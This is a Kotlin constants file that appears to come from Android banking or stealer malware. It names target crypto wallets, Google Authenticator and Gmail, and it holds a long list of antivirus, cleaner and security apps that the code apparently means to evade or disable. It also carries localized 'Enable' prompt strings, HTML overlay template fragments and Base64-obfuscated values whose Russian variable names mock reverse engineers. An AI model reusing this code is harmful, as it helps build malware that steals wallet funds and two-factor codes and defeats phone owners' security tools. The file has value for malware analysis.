package com.xxx.zzz.globp

import android.util.Base64
import java.nio.charset.Charset

object constNm {
    val utf = Charsets.UTF_8

    val не_трогай: String = base64Decode("LCJleGl0IjoiIg==")
    val хренов_реверсер: String = base64Decode("LCJleGl0IjoidHJ1ZSI=")
    val ключ_от_всего: String = base64Decode("PGh0bWwgbGFuZz0iZW4iPg==")
    val шифрование: String = base64Decode("PGh0bWwgbGFuZz0i")
    val ss5: String = base64Decode("Ij4=")

    val s104: String = "'"
    val s107: String = "var lang = 'en'"
    val s108: String = "var lang = '"
    val s109: String = "app = 'THISSTRINGREPLACEWITHAPPNAME'"
    val s110: String = "app = '"
    val s111: String = "'"

    val authenticator2: String = "com.google.android.apps.authenticator2"
    val trustapp: String = "com.wallet.crypto.trustapp"
    val mwallet: String = "com.bitcoin.mwallet"
    val mycelium: String = "com.mycelium.wallet"
    val piuk: String = "piuk.blockchain.android"
    val samourai: String = "com.samourai.wallet"
    val toshi: String = "org.toshi"
    val gmail: String = "com.google.android.gm"
    val metamask: String = "io.metamask"
    val safepal: String = "io.safepal.wallet"
    val exodus: String = "exodusmovement.exodus"

    val l3: String =
        "{" +
                "'en':'Enable'," +
                "'de':'Aktivieren'," +
                "'af':'Aktiveer'," +
                "'zh':'启用'," +
                "'cs':'Zapnout'," +
                "'nl':'Activeren'," +
                "'fr':'Activer'," +
                "'it':'Abilitare'," +
                "'ja':'有効にする'," +
                "'ko':'사용하다'," +
                "'pl':'włączyć'," +
                "'es':'Habilitar'," +
                "'ar':'يُمكّن'," +
                "'bg':'Възможност'," +
                "'ca':'Habilitar'," +
                "'hr':'Aktivirati'," +
                "'da':'Aktivere'," +
                "'fi':'Ottaa käyttöön'," +
                "'el':'ενεργοποιώ'," +
                "'iw':'הפוך לזמין'," +
                "'hi':'सक्षम करें'," +
                "'hu':'Engedélyez'," +
                "'ru':'Включить'," +
                "'in':'Fungsikan'," +
                "'lv':'Aktivizēt'," +
                "'lt':'Aktyvinti'," +
                "'nb':'Aktivere'," +
                "'pt':'Ativar'," +
                "'ro':'Activa'," +
                "'sr':'Aktivirati'," +
                "'sk':'Aktivovať'," +
                "'sl':'Vključiti'," +
                "'sv':'Aktivera'," +
                "'th':'เปิดใช้งาน'," +
                "'tr':'Etkinleştirmek'," +
                "'vi':'có hiệu lực'" +
                "}"

    var тупые_реверсы_думают_что_эти_приложения_будем_атаковать = arrayOf(
        "com.kms.free",
        "com.drweb",
        "com.eset.endpoint",
        "com.eset.parental",
        "com.eset.stagefrightdetector",
        "com.eset.ems2.gp",
        "com.eset.ems2.megafon",
        "com.eset.ems2.mts",
        "com.eset.ems2.beeline",
        "com.eset.ems2.tele2",
        "com.eset.ems2.yota",
        "com.eset.ems2.vodafone",
        "com.eset.ems2.telekom",
        "com.eset.ems2.stc",
        "com.eset.ems2.turkcell",
        "com.eset.ems2.movistar",
        "com.eset.ems2.yoigo",
        "com.eset.ems2.lycamobile",
        "com.estrongs.android.pop",
        "com.iobit.mobilecare",
        "com.androhelm.antivirus.free",
        "com.androhelm.antivirus.free1",
        "com.androhelm.antivirus.free2",
        "com.androhelm.antivirus.tablet.premium",
        "com.androhelm.antivirus.premium",
        "com.androhelm.antivirus.tablet.pro",
        "com.androhelm.antivirus.pro",
        "com.antivirus",
        "com.coopresapps.free.antivirus",
        "com.conenestpps.fade.andivires",
        "com.antivirus.applock.cleanbooster",
        "net.apptools.antivirusfree.security.cleanmaster",
        "com.antivirus.mobilesecurity.viruscleaner.applock",
        "com.zrgiu.antivirus",
        "com.bitdefender.antivirus",
        "com.taptechnology.antivirus.mobile",
        "com.avira.android",
        "com.antivirussystemforandroid.brainiacs.googleplay",
        "com.guardian.security.pri",
        "com.avast.android.mobilesecurity",
        "com.avg.cleaner",
        "com.antiy.avl",
        "com.bitdefender.security",
        "virus.cleaner.antivirus.phone.security.boost",
        "com.trendmicro.freetmms.gmobi",
        "com.drweb.mcc",
        "com.drweb",
        "com.drweb.pro",
        "com.falcon.antivirus",
        "com.hawk.security",
        "com.arcane.incognito",
        "com.security.antivirus.clean",
        "com.kaspersky.kes",
        "com.kms.free",
        "com.kaspersky.security.cloud",
        "jp.naver.lineantivirus.android",
        "com.lookout",
        "org.malwarebytes.antimalware",
        "com.wsandroid.suite",
        "com.trendmicro.tmmspersonal",
        "com.nqmobile.antivirus20",
        "com.nkapa.antivirus.safephone.security",
        "com.zoner.android.antivirus",
        "com.iobit.amccleaner.booster",
        "com.avast.android.cleaner",
        "com.avira.optimizer",
        "com.cleanmaster.mguard",
        "cleanmaster.phone.memory.booster.cleaner",
        "com.estrongs.android.pop",
        "com.symantec.cleansweep",
        "com.pandasecurity.pandaav",
        "com.sophos.smsec",
        "com.bestanti.phoneboots",
        "com.dotakapp.Booster.cleaner",
        "com.piriform.ccleaner",
        "com.huawei.securitymgr",
        "com.miui.guardprovider",
        "com.qualcomm.qti.qms.service.telemetry",
        "com.qualcomm.qti.poweroffalarm",
        "com.xiaomi.powerchecker",
        "com.ghisler.android.TotalCommander",
        "com.miui.securitycenter",
        "eu.thedarken.sdm",
        "com.google.android.gsf",
        "com.a0soft.gphone.acc.free",
        "booster.optimizer.cleaner",
        "com.battery.smart.manager",
        "com.ace.cleaner",
        "org.adblockplus.adblockplussbrowser",
        "com.adguard.android.contentblocker",
        "com.boxita.booster.supercleaner",
        "imoblife.toolbox.full",
        "com.iobit.amccleaner.lite.booster",
        "com.excel.apps.cleaner.ram10gb",
        "appinventor.ai_mmfrutos7878.Ancleaner",
        "com.advancedprocessmanager",
        "com.google.android.projection.gearhead",
        "com.mytools.cleaner.booster",
        "com.ninexgen.cleaner",
        "com.apusapps.turbocleaner",
        "com.ashampoo.auto.clean.up",
        "com.s.cleaner",
        "com.appybuilder.dennis_littawe1542.BCleaner",
        "com.betteridea.file.cleaner",
        "com.cache.cleaner.booster.ram.storage",
        "com.frozendevs.cache.cleaner",
        "com.jrummy.cache.cleaner",
        "com.lighthouseadstech.chiefcleaner",
        "com.swings.cacheclear",
        "com.litetools.cleaner",
        "com.rambooster.ram.ramcleaner",
        "com.onegogo.explorer",
        "clean.booster.phone",
        "com.phonebooster.cooler.junkcleaner.appclean.speed",
        "com.phone.cleaner.speed.booster.cleaningmaster",
        "com.turbocooler.turbobooster.turbocleaner.cpumaster",
        "com.theappsstorm.clean.boost.max.fast.cool",
        "clean.antivirus.security.viruscleaner",
        "com.clean.boost.cacheclear",
        "com.digibites.accubattery",
        "com.stolitomson",
        "net.hubalek.android.reborn.beta",
        "com.elvison.batterywidget",
        "com.geekyouup.android.widgets.battery",
        "tech.tools.battery",
        "com.a0soft.gphone.aDataOnOff",
        "dev.instruments.optimaizer",
        "com.kdevstudio.w.cleaner",
        "com.lookandfeel.cleanerforwhatsapp",
        "com.ushareit.cleanit",
        "com.glgjing.hulk",
        "com.appeteria.battery100alarm",
        "com.clear.cache.app",
        "com.clearMemoryAdcoms",
        "com.gombosdev.ampere",
        "com.speedoptimize.tool.clean",
        "com.quanqu.master.clean",
        "ccc71.bmw",
        "com.ashampoo.droid.optimizer",
        "com.limsky.speedbooster",
        "com.batterypro.batteryrepairlife2020",
        "com.finalwire.aida64",
        "com.kaerosduplicatescleaner",
        "com.ludashi.superclean",
        "com.ludashi.clean.lite",
        "com.shere.easycleaner",
        "net.lepeng.batterydoctor",
        "com.phone.optimize.battery.saver.fastcharging",
        "com.mobilestudios.cl.batteryturbocharger",
        "com.expert.cleaner.phone.cleaner.speed.booster",
        "com.jrm.batterysaver",
        "jp.snowlife01.android.cache_delete",
        "com.batteryoptimizer.fastcharging.fastcharger",
        "com.eco.fastcharger",
        "com.mastudio.smartboost.coolerapp.fastsupercleaner",
        "com.powerd.cleaner",
        "com.tappx.flipnsave.battery",
        "org.artsplanet.android.sunaobattery",
        "com.antivirus.free.security.cleaner",
        "com.gto.zero.zboost",
        "com.nqmobile.battery",
        "com.iekie.free.clean",
        "com.gsamlabs.bbm",
        "com.clearcache.cachecleaner.junkremoval",
        "com.kaspersky.batterysaver",
        "com.macminiandroid.antivirus.antivirus360",
        "com.virus.cleaner.antivirus.clean",
        "com.androidantivirus",
        "com.cxzh.antivirus",
        "com.comodo.cisme.antivirus",
        "org.antivirus.tablet",
        "com.fsecure.ms.safe",
        "com.scanvirus.antivirus.security",
        "com.jb.security",
        "com.lookout.heartbleeddetector",
        "com.junkremoval.pro",
        "com.google.android.apps.nbu.files",
        "com.projectstar.ishredder.android.standard",
        "com.k7computing.android.security",
        "com.samsung.android.knox.enrollment",
        "com.bryancandi.knoxcheck",
        "com.linpus.battery",
        "com.lookout.net",
        "com.phone.mastercleaner",
        "com.bass.max.cleaner",
        "com.newimax.cleaner",
        "imoblife.memorybooster.lite",
        "com.localapp.waqar.batterysaver",
        "com.appsinnova.android.keepclean.lite",
        "com.appsinnova.android.keepclean",
        "com.nero.tuneitup",
        "com.symantec.mobilesecurity",
        "com.noxgroup.app.security",
        "com.cleanteam.oneboost",
        "com.cleanteam.onesecurity",
        "phone.cleaner.speed.booster.cache.clean.android.master",
        "phone.cleaner.speed.booster",
        "com.super.cleaner.phone.cleaner.speed.batterysaver",
        "com.distimo.phoneguardian",
        "com.transsion.phonemaster",
        "huera.cpu.cleaner",
        "com.sup.phone.cleaner.booster.app",
        "com.qcleaner",
        "redpi.apps.quickcleanfree",
        "com.kosajun.easymemorycleaner",
        "com.cacheclean.cleanapp.cacheappclean",
        "com.qihoo.security",
        "com.qihoo.security.lite",
        "com.maxdevlab.cleaner.security",
        "com.tatkovlab.sdcardcleaner",
        "com.nepel.scandriveanti",
        "com.simplitec.simplitecapp",
        "com.rootuninstaller.rambooster",
        "com.rootuninstaller.ramboosterpro",
        "com.xtraszone.smartclean",
        "com.smartapps.cleanboost.cool.optimize",
        "com.studio.coolmaster.coolerapp.cooling",
        "org.spaceapp.cleaner",
        "com.appnextg.cleaner",
        "com.litetools.speed.booster",
        "advanced.speed.booster",
        "com.rvappstudios.speed_booster_junk_cleaner",
        "com.jaybox.cleaner.security",
        "com.cache.cleaner.cachecleaner.booster.storage",
        "com.egostudio.clean",
        "com.youtupu.superclean",
        "com.ludashi.security",
        "com.hermes.superb.oem",
        "com.huawei.hwid",
        "com.powerful.cleaner",
        "com.netqin.aotkiller",
        "system.optimizer",
        "com.topcleaner.booster",
        "com.totalcleanerlite.android",
        "com.totalsecurity.app",
        "com.securitydefend.totalvirusdefender",
        "phone.antivirus.virus.cleaner.junk.clean.speed.booster.master",
        "com.wf.wfbattery",
        "com.sbits.whatsappcleaner",
        "com.baloota.xcleaner",
        "com.zemana.msecurity",
        "com.appsinnova.android.battery",
        "fancyclean.cleaner.boost.privacy.antivirus.mini",
        "fancyclean.boost.antivirus.junkcleaner",
        "com.fancyclean.security.antivirus",
        "com.iclean.master.boost",
        "com.appsinnova.android.keepsecure",
        "com.noxgroup.app.cleaner",
        "fastcharger.cleanmaster.batterysaver.batterydoctor",
        "antivirus.anti.virus.cleaner.security.booster",
        "org.strong.booster.cleaner.fixer",
        "com.clean.booster.optimizer",
        "com.atvcleaner",
        "com.antivirus.cleaner.for.android.vpn.app.lock.bsafe",
        "com.radialapps.antivirus.battery.appbooster.cleaner",
        "ch.smalltech.battery.free",
        "com.macropinch.pearl",
        "com.fastcharger.profastcharging",
        "com.mobile_infographics_tools.mydrive",
        "com.avrilapp.appskiller",
        "com.androidrocker.taskkiller",
        "com.pextor.batterychargeralarm",
        "com.fulminesoftware.batteryindicator",
        "com.diezgames.battery",
        "com.luko.parallel.smart.manager.batterysaver.boost.optimizer.cleaner",
        "bazinga.historyclean",
        "com.bazinga.cacheclean",
        "cleaner.junk.booster.boost.clear.clean.cachecleaner.clearcache.cleancache.optimize.cache.allcleaner",
        "com.ruhax.cleandroid",
        "cache.optimize.cleancache.clearcache.cachecleaner.clean.clear.boost.booster.junk",
        "com.androidtools.miniantivirus",
        "com.phone.cache.superpowercleaner",
        "me.empirical.android.application.truerambooster",
        "com.cleanmyphone.cleanmyandroid.freeupspace",
        "com.alberto.cleaner.files.photos.clean",
        "fast.phone.clean",
        "com.zeroneapps.cachecleaner",
        "com.MSlaytter.ramzero",
        "com.empty.folder.cleaner.emptyfoldercleaner.removeemptyfolders",
        "com.mobikeeper.global",
        "com.geekslab.cleanboost",
        "supercleaner.phonecleaner.batterydoctor.fastcharging",
        "phone.cleaner.antivirus.speed.booster",
        "phonecooler.cpucooler.coolermaster.batterycooler",
        "com.phonecleaner.memorycleaner.fastcharging",
        "ddolcatmaster.mypowermanagement",
        "com.mobique.deleteapps",
        "proapp.booster.ram.memory",
        "com.booster.mobile.cache.cleanerfree",
        "com.booster.mobile.cache.cleanerpro",
        "com.cleamyandroid.booster.mobile",
        "com.goodapp.phonecleaner.booster",
        "com.toolapp.speedbooster.cleaner",
        "fast.cleaner.battery.saver.pro",
        "infomagicien.cleaner_phone",
        "sec.huawei.com"
    )

    fun base64Decode(str: String?): String {
        return try {
            val data = Base64.decode(str, Base64.DEFAULT)
            data.toString(Charset.forName("UTF-8"))
        } catch (ex: Exception) {
            ""
        }
    }
}
